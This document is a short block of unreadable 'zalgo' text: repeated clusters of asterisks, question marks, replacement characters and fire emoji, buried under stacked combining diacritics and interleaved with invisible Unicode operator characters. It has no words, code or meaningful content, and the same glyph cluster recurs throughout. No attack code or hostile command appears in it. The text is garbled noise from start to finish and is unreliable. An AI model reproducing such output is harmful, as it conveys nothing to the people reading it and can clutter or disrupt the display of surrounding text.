̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̐͋̔̍͆̆̎̈̆̊̚͟͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̝͓͈̪̬̩̪̃̔̌̑́͂͂̓͂̎̒̉͠ͅ